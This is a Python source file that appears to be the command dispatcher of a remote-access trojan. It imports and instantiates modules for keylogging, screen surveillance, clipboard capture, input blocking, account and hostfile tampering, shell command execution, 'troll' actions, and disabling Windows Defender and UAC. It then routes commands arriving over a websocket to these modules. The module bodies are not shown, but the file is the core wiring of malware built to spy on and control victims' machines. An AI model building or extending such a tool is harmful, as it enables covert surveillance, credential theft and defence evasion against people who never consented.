from .modules.troll.window_troll import WindowTroll
from .modules.troll.type_message import TypeMessage
from .modules.input_output.window import Window
from .modules.file_system import FileSystem
from .modules.file_system.download import Download
from .modules.system.accounts import AccountManager
from .modules.system.hardware import HardwareInfo
from .modules.system.hostfile import Hostfile
from .modules.system.logs import Logs
from .modules.system.PC import Pc
from .modules.system.task_manager import TaskManager
from .modules.system.process import ProcessManager
from .modules.system.network import NetworkInfo
from .modules.system.cmd import CMD
from .modules.system.firewall import Firewall
from .modules.system.internet import Internet
from .modules.system.sys_information import SysInfo
from .modules.system.installed_programs import Programs
from .modules.surveillance.visual import Visuals
from .modules.input_output.clipboard import Clipboard
from .modules.commands import Command, CommandArgs, command_to_module_map, ICommandModule, CommandResult
from .modules.input_output.block_input import BlockInput
from .modules.surveillance.keylog import Keylog
from .modules.troll.cd import Cd
from .modules.troll.website_spam import WebsiteSpam
from .modules.persistence.defender import Defender
from .modules.persistence.uac import UAC
from .modules.troll import TrollActions
from .modules.scripting_interface import Scripting

import websockets

filesystem_handler = FileSystem()
download = Download()
accounts = AccountManager()
hardware = HardwareInfo()
hostfile = Hostfile()
logs = Logs()
pc = Pc()
taskmanager = TaskManager()
process = ProcessManager()
network = NetworkInfo()
cmd = CMD()
firewall = Firewall()
internet = Internet()
sys_info = SysInfo()
programs = Programs()
clipboard = Clipboard()
window = Window()
visuals = Visuals()
block_input = BlockInput()
keylog = Keylog()
cd = Cd()
type_message = TypeMessage(BlockInput())
website_spam = WebsiteSpam(BlockInput())
window_troll = WindowTroll()
defender = Defender()
uac = UAC()
troll = TrollActions(block_input=BlockInput())
scripting = Scripting()

def module_factory(module_name: str) -> ICommandModule:
    module_name_map = {
        "file_system" : filesystem_handler,
        "download" : download,
        "accounts" : accounts,
        "hardware" : hardware,
        "hostfile" : hostfile,
        "logs" : logs,
        "pc" : pc,
        "taskmanager" : taskmanager,
        "process" : process,
        "network" : network,
        "cmd" : cmd,
        "firewall" : firewall,
        "internet" : internet,
        "sys_info" : sys_info,
        "programs" : programs,
        "clipboard" : clipboard,
        "window" : window,
        "visuals" : visuals,
        "block_input" : block_input,
        "keylog" : keylog,
        "cd" : cd,
        "type_message" : type_message,
        "website_spam" : website_spam,
        "window_troll": window_troll,
        "defender" : defender,
        "uac" : uac,
        "troll" : troll,
        "scripting" : scripting
    }
    if module_name not in module_name_map:
        raise ValueError("Module Not found")
    return module_name_map[module_name]


def command_executor(command: Command, args: CommandArgs) -> CommandResult:
    mod_name = command_to_module_map[command]
    print(f"Using {mod_name}")
    module = module_factory(mod_name)
    return module.run(command, args)

async def command_executor_ws(command: Command, args: CommandArgs, websocket: websockets.WebSocketClientProtocol) -> None:
    mod_name = command_to_module_map[command]
    print(f"Using {mod_name}")
    module = module_factory(mod_name)
    await module.ws_run(command, args, websocket)
